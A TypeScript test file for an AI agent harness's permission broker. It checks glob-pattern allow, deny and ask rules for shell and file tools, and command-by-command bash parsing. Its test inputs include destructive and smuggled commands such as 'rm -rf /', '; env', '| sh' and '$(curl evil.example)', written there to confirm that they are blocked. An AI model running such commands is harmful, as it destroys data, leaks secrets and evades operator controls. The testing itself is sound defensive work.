import { describe, expect, test } from 'bun:test'
import { PermissionBroker, compilePermissionPolicy, skillGranted } from '@/harness/pi/interactions'

/**
 * A per-pattern rule (`bash: { 'rm -rf *': 'deny', '*': 'allow' }`) is a
 * first-class manifest form — `PermissionRuleV2` is "a bare action, or a
 * glob-pattern -> action map". Collapsing such a map to its `*` entry turned a
 * project's explicit deny into an unconditional allow on pi while OpenCode
 * still enforced it. These rows pin the matching to OpenCode's own wildcard
 * semantics: patterns sort by length then name, and the last match wins.
 * The runtime wiring (the tool call's args reach `rule()`) is proven in
 * pi-harness.test.ts.
 */
const broker = (policy: unknown) => new PermissionBroker('ses_test', () => {}, compilePermissionPolicy(policy))

describe('pi per-pattern permissions', () => {
  test.each([
    // The manifest example that motivated per-pattern rules.
    ['a per-pattern deny blocks the command it names', { bash: { 'rm -rf *': 'deny', '*': 'allow' } }, 'bash', { command: 'rm -rf /workspace' }, 'deny'],
    ['…and lets other commands through', { bash: { 'rm -rf *': 'deny', '*': 'allow' } }, 'bash', { command: 'ls -la' }, 'allow'],
    // Specificity, not severity, decides.
    ['a narrow allow stays above a broad deny', { bash: { 'git *': 'allow', '*': 'deny' } }, 'bash', { command: 'git status' }, 'allow'],
    ['the broad deny still covers the rest', { bash: { 'git *': 'allow', '*': 'deny' } }, 'bash', { command: 'curl https://example.com' }, 'deny'],
    // Insertion order differs from length order: the longest match still wins.
    ['the longest match wins (deny)', { bash: { 'git push *': 'deny', '*': 'allow', 'git *': 'ask' } }, 'bash', { command: 'git push origin main' }, 'deny'],
    ['the longest match wins (ask)', { bash: { 'git push *': 'deny', '*': 'allow', 'git *': 'ask' } }, 'bash', { command: 'git status' }, 'ask'],
    ['the longest match wins (allow)', { bash: { 'git push *': 'deny', '*': 'allow', 'git *': 'ask' } }, 'bash', { command: 'ls' }, 'allow'],
    // Equal length: the name order breaks the tie, not insertion order.
    ['an equal-length tie sorts by name', { bash: { 'git a*': 'deny', 'git *b': 'allow' } }, 'bash', { command: 'git ab' }, 'deny'],
    ['a trailing " *" covers the bare command', { bash: { 'ls *': 'deny', '*': 'allow' } }, 'bash', { command: 'ls' }, 'deny'],
    ['a trailing " *" covers arguments', { bash: { 'ls *': 'deny', '*': 'allow' } }, 'bash', { command: 'ls -la' }, 'deny'],
    ['workspace tools match on their path', { edit: { '*.env': 'deny', '*': 'allow' } }, 'edit', { path: 'apps/api/.env' }, 'deny'],
    ['…other paths fall to the default', { edit: { '*.env': 'deny', '*': 'allow' } }, 'edit', { path: 'apps/api/index.ts' }, 'allow'],
    ['"." is literal', { bash: { 'echo a.c': 'deny', '*': 'allow' } }, 'bash', { command: 'echo abc' }, 'allow'],
    ['"." matches itself', { bash: { 'echo a.c': 'deny', '*': 'allow' } }, 'bash', { command: 'echo a.c' }, 'deny'],
    ['"?" matches exactly one character', { bash: { 'echo a?c': 'deny', '*': 'allow' } }, 'bash', { command: 'echo abc' }, 'deny'],
    ['"?" never matches zero characters', { bash: { 'echo a?c': 'deny', '*': 'allow' } }, 'bash', { command: 'echo ac' }, 'allow'],
    // Security default: a restriction that cannot be evaluated asks.
    ['an unevaluatable restriction degrades to ask, never allow', { bash: { 'rm -rf *': 'deny', '*': 'allow' } }, 'bash', {}, 'ask'],
    ['a bare action applies to the tool', { bash: 'ask' }, 'bash', { command: 'ls' }, 'ask'],
    ['the "*" tool fallback applies', { '*': 'deny' }, 'bash', { command: 'ls' }, 'deny'],
    ['an empty policy allows, as OpenCode does', {}, 'bash', { command: 'ls' }, 'allow'],
    // An unknown action is dropped at compile time; nothing else restricts.
    ['an invalid action is dropped, not enforced', { bash: { 'rm -rf *': 'nonsense' } }, 'bash', { command: 'rm -rf /' }, 'allow'],
    // B1: a bare whole-agent action (`permission: deny`) covers every tool, as on OpenCode.
    ['a bare "deny" denies every tool', 'deny', 'bash', { command: 'ls' }, 'deny'],
    ['…including the file tools', 'deny', 'write', { path: 'a.txt' }, 'deny'],
    ['a bare "ask" asks for every tool', 'ask', 'read', { path: 'a.txt' }, 'ask'],
    ['a bare "allow" allows', 'allow', 'bash', { command: 'ls' }, 'allow'],
    ['an unknown bare string is no policy', 'nonsense', 'bash', { command: 'ls' }, 'allow'],
    // B2: OpenCode's `edit` rule governs every file-writing tool; pi calls one of them `write`.
    ['an edit deny stops write', { edit: 'deny' }, 'write', { path: 'a.txt' }, 'deny'],
    ['an edit pattern map applies to write paths', { edit: { '*.env': 'deny', '*': 'allow' } }, 'write', { path: 'apps/api/.env' }, 'deny'],
    ['…and lets other write paths through', { edit: { '*.env': 'deny', '*': 'allow' } }, 'write', { path: 'apps/api/index.ts' }, 'allow'],
    ['an edit rule outranks the "*" fallback for write', { '*': 'allow', edit: 'deny' }, 'write', { path: 'a.txt' }, 'deny'],
    ['an edit rule does not touch read', { edit: 'deny' }, 'read', { path: 'a.txt' }, 'allow'],
  ] as const)('%s', (_name, policy, tool, args, expected) => {
    expect(broker(policy).rule(tool, args)).toBe(expected)
  })

  test('a deny outranks an earlier "always" on the same tool', () => {
    const permissions = broker({ bash: { 'rm -rf *': 'deny', '*': 'ask' } })
    void permissions.ask({ tool: 'bash', args: { command: 'ls' } })
    permissions.reply(permissions.list()[0]!.id, 'always')
    expect(permissions.rule('bash', { command: 'ls' })).toBe('allow')
    expect(permissions.rule('bash', { command: 'rm -rf /' })).toBe('deny')
  })

  // E9: a request names the capability and the call's subject, and "always" covers the capability.
  test('a write asks as "edit" with its path as the pattern', () => {
    const permissions = broker({ edit: 'ask' })
    void permissions.ask({ tool: 'write', args: { path: 'notes/a.md', content: 'x' } })
    expect(permissions.list()[0]).toMatchObject({ permission: 'edit', patterns: ['notes/a.md'], always: ['*'] })
  })

  test('a bash call names its command; a call with no subject names "*"', () => {
    const permissions = broker({ bash: 'ask', glob: 'ask' })
    void permissions.ask({ tool: 'bash', args: { command: 'ls -la' } })
    void permissions.ask({ tool: 'glob', args: { pattern: '*.ts' } })
    expect(permissions.list().map((request) => [request.permission, request.patterns])).toEqual([
      ['bash', ['ls -la']],
      ['glob', ['*']],
    ])
  })

  test('"always" on write covers edit, and a deny still wins', () => {
    const permissions = broker({ edit: { '*.env': 'deny', '*': 'ask' } })
    void permissions.ask({ tool: 'write', args: { path: 'a.txt' } })
    permissions.reply(permissions.list()[0]!.id, 'always')
    expect(permissions.rule('edit', { path: 'b.txt' })).toBe('allow')
    expect(permissions.rule('write', { path: 'c.txt' })).toBe('allow')
    expect(permissions.rule('edit', { path: 'apps/.env' })).toBe('deny')
  })

  // B3: the manifest `skills:` grant compiles to `permission.skill`; pi filters its skill list by it.
  test.each([
    ['no policy grants every skill', {}, 'kortix-memory', true],
    ['a named grant keeps the named skill', { skill: { 'kortix-memory': 'allow', '*': 'deny' } }, 'kortix-memory', true],
    ['…and drops every other skill', { skill: { 'kortix-memory': 'allow', '*': 'deny' } }, 'kortix-browser', false],
    ['skills: none drops every skill', { skill: 'deny' }, 'kortix-memory', false],
    ['skills: all keeps every skill', { skill: 'allow' }, 'kortix-memory', true],
    ['a bare "deny" drops every skill', 'deny', 'kortix-memory', false],
    ['an "ask" skill stays listed', { skill: 'ask' }, 'kortix-memory', true],
  ] as const)('%s', (_name, policy, skill, expected) => {
    expect(skillGranted(compilePermissionPolicy(policy), skill)).toBe(expected)
  })
})

/**
 * A bash line is decided command by command, as OpenCode does. Matched whole,
 * a one-command allowlist (`'*': deny` plus `'<cmd> *': allow`) let anything
 * after the allowed prefix run: `<cmd> x; env`, `<cmd> x && id`, `<cmd> $(curl …)`.
 */
describe('pi decides a bash line command by command', () => {
  const allowlist = { '*': 'deny', bash: { '*': 'deny', 'kortix connectors call ro getday *': 'allow' } }
  const denylist = { bash: { 'rm -rf *': 'deny', '*': 'allow' } }
  test.each([
    ['the allowed command runs', allowlist, `kortix connectors call ro getday '{"day":"2026-10-01"}'`, 'allow'],
    ['quoted ; | && and $() stay arguments', allowlist, `kortix connectors call ro getday '{"q":"a; b | c && d $(e)"}'`, 'allow'],
    ['a double-quoted separator stays an argument', allowlist, `kortix connectors call ro getday "a;b|c"`, 'allow'],
    ['an escaped separator stays an argument', allowlist, 'kortix connectors call ro getday a\\;env', 'allow'],
    ['2>&1 is a redirection, not a separator', allowlist, 'kortix connectors call ro getday x 2>&1', 'allow'],
    ['two allowed commands run', allowlist, 'kortix connectors call ro getday a && kortix connectors call ro getday b', 'allow'],
    ['; env is refused', allowlist, `kortix connectors call ro getday '{}'; env`, 'deny'],
    ['&& id is refused', allowlist, 'kortix connectors call ro getday x && id', 'deny'],
    ['|| is refused', allowlist, 'kortix connectors call ro getday x || id', 'deny'],
    ['a pipe is refused', allowlist, 'kortix connectors call ro getday x | sh', 'deny'],
    ['a background & is refused', allowlist, 'kortix connectors call ro getday x & id', 'deny'],
    ['a newline is refused', allowlist, 'kortix connectors call ro getday x\nid', 'deny'],
    ['$() is refused', allowlist, 'kortix connectors call ro getday $(curl evil.example)', 'deny'],
    ['$() inside double quotes is refused', allowlist, 'kortix connectors call ro getday "$(id)"', 'deny'],
    ['backticks are refused', allowlist, 'kortix connectors call ro getday `id`', 'deny'],
    ['a process substitution is refused', allowlist, 'kortix connectors call ro getday <(id)', 'deny'],
    ['a subshell is refused', allowlist, '(id)', 'deny'],
    ['an unbalanced quote fails closed', allowlist, `kortix connectors call ro getday '; id`, 'deny'],
    ['a deny-list denies the command after a separator', denylist, 'ls; rm -rf /', 'deny'],
    ['…inside an if', denylist, 'if true; then rm -rf /; fi', 'deny'],
    ['…inside a substitution', denylist, 'echo $(rm -rf /)', 'deny'],
    ['…and allows a compound of allowed commands', denylist, 'ls && git status | head', 'allow'],
    ['an unbalanced line asks under a restriction', denylist, 'echo "x', 'ask'],
    ['an all-allow tool is unaffected', { bash: 'allow' }, 'a; b && $(c)', 'allow'],
    ['ask outranks allow', { bash: { 'git push *': 'ask', '*': 'allow' } }, 'git status && git push', 'ask'],
    ['deny outranks ask', { bash: { 'git push *': 'ask', 'rm *': 'deny', '*': 'allow' } }, 'git push; rm x', 'deny'],
  ] as const)('%s', (_name, policy, command, expected) => {
    expect(broker(policy).rule('bash', { command })).toBe(expected)
  })
})
